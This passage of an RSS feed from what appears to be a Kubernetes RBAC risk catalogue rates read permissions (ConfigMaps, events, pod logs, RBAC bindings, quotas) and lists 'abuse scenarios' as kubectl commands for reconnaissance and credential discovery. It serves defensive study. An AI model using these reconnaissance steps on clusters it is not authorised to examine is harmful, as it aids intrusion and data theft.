&lt;p>Grants access to read all ConfigMaps across all namespaces. ConfigMaps can store non-sensitive configuration data but may sometimes inadvertently contain sensitive information, API endpoints, or settings that could be exploited, leading to information disclosure.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all ConfigMaps across all namespaces.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get configmaps --all-namespaces
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Retrieve a specific ConfigMap&amp;rsquo;s data.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; -o yaml
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get configmap kube-proxy -n kube-system -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read ConfigMaps in a namespace</title><link>https://rbac-atlas.github.io/rules/1023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1023/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1023&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read ConfigMaps in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>configmaps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-configmapaccess">&lt;a href="https://rbac-atlas.github.io/tags/configmapaccess/">ConfigMapAccess&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits reading ConfigMaps within a specific namespace. This can lead to information disclosure if ConfigMaps store sensitive configuration details, connection strings, or other exploitable data for applications within that namespace.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all ConfigMaps in a specific namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get configmaps -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get configmaps my-app-config -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Retrieve a specific ConfigMap&amp;rsquo;s data within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; -o yaml
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get configmap my-app-settings -n production -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read CSINode Objects (Node &amp; Storage Reconnaissance)</title><link>https://rbac-atlas.github.io/rules/1100/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1100/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1100&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read CSINode Objects (Node &amp;amp; Storage Reconnaissance)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>storage.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>csinodes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-storagedetailsdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/storagedetailsdisclosure/">StorageDetailsDisclosure&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading CSINode objects cluster-wide. These objects contain information about CSI drivers running on nodes, including driver names, node IDs, and sometimes topology keys. This can reveal details about the storage architecture and potentially vulnerable CSI driver versions or configurations.&lt;/p></description></item><item><title>Read CSIStorageCapacities (Namespace Storage Reconnaissance)</title><link>https://rbac-atlas.github.io/rules/1101/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1101/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1101&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read CSIStorageCapacities (Namespace Storage Reconnaissance)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-low">Low&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>storage.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>csistoragecapacities&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-storagedetailsdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/storagedetailsdisclosure/">StorageDetailsDisclosure&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading CSIStorageCapacity objects, usually within a namespace. These objects provide information about the storage capacity available through CSI drivers for specific storage classes. This can help attackers understand storage limits and potentially identify underutilized or overallocated storage.&lt;/p></description></item><item><title>Read events cluster-wide</title><link>https://rbac-atlas.github.io/rules/1070/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1070/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1070&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read events cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core, events.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>events&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-operationaldata">&lt;a href="https://rbac-atlas.github.io/tags/operationaldata/">OperationalData&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading all events across all namespaces. Events can reveal sensitive operational information, error messages, pod creation/deletion activity, image names, and other details that could aid an attacker in reconnaissance or identifying vulnerabilities.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all events across all namespaces.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get events --all-namespaces
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Watch events in real-time across all namespaces.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get events --all-namespaces --watch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read LimitRanges (Namespace Information Disclosure)</title><link>https://rbac-atlas.github.io/rules/1087/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1087/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1087&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read LimitRanges (Namespace Information Disclosure)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-low">Low&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>limitranges&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-resourceconfiguration">&lt;a href="https://rbac-atlas.github.io/tags/resourceconfiguration/">ResourceConfiguration&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading LimitRange objects within a namespace. This can reveal resource constraints for pods and containers, helping attackers understand default resource allocations and potentially tailor resource exhaustion attacks or identify tightly constrained environments.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all LimitRanges in a specific namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get limitranges -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get limitranges -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Get the YAML definition of a specific LimitRange.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get limitrange &amp;lt;limitrange-name&amp;gt; -n &amp;lt;namespace&amp;gt; -o yaml
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get limitrange default-limits -n default -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read pod logs cluster-wide</title><link>https://rbac-atlas.github.io/rules/1018/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1018/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1018&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read pod logs cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/log&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterwidelogaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusterwidelogaccess/">ClusterWideLogAccess&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows accessing logs from any pod across all namespaces in the cluster. This can lead to information disclosure if logs contain sensitive data, credentials, or operational details that could be exploited.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Retrieve logs from a specific pod in any namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl logs &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl logs coredns-xxxx-yyyy -n kube-system&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Retrieve logs from all containers in a multi-container pod.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl logs &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; --all-containers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl logs my-app-pod -n default --all-containers&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read pod logs in a namespace</title><link>https://rbac-atlas.github.io/rules/1019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1019/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1019&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read pod logs in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/log&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-logaccess">&lt;a href="https://rbac-atlas.github.io/tags/logaccess/">LogAccess&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to read logs from pods within a specific namespace. This can expose sensitive application data, credentials, or operational details if present in the logs, leading to information disclosure.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Retrieve logs from a specific pod within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl logs &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl logs my-web-app-pod -n production&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Retrieve logs from a specific container in a pod within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl logs &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -c &amp;lt;container-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl logs my-app-pod -n default -c init-db&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read RBAC configuration cluster-wide</title><link>https://rbac-atlas.github.io/rules/1077/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1077/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1077&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read RBAC configuration cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>clusterroles, roles, clusterrolebindings, rolebindings&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-rbacquery">&lt;a href="https://rbac-atlas.github.io/tags/rbacquery/">RBACQuery&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows listing and getting all ClusterRoles, Roles, ClusterRoleBindings, and RoleBindings. This provides full visibility into the cluster&amp;rsquo;s authorization model, aiding attackers in finding privilege escalation paths or understanding defenses.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all ClusterRoles in the cluster.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get clusterroles
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>List all RoleBindings across all namespaces.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get rolebindings --all-namespaces
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>Get the YAML definition of a specific ClusterRole.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get clusterrole &amp;lt;clusterrole-name&amp;gt; -o yaml
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get clusterrole cluster-admin -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read ResourceQuotas (Namespace Information Disclosure)</title><link>https://rbac-atlas.github.io/rules/1088/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1088/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1088&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read ResourceQuotas (Namespace Information Disclosure)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-low">Low&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>resourcequotas&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-quotatampering">&lt;a href="https://rbac-atlas.github.io/tags/quotatampering/">QuotaTampering&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-resourceconfiguration">&lt;a href="https://rbac-atlas.github.io/tags/resourceconfiguration/">ResourceConfiguration&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading ResourceQuota objects within a namespace. This reveals configured resource limits for the namespace, aiding attackers in understanding constraints and potentially tailoring resource exhaustion or identifying high-value namespaces.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all ResourceQuotas in a specific namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get resourcequotas -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get resourcequotas -n production&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Get the YAML definition of a specific ResourceQuota.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get resourcequota &amp;lt;resourcequota-name&amp;gt; -n &amp;lt;namespace&amp;gt; -o yaml
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get resourcequota compute-resources -n production -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read secrets cluster-wide</title><link>https://rbac-atlas.github.io/rules/1010/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1010/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
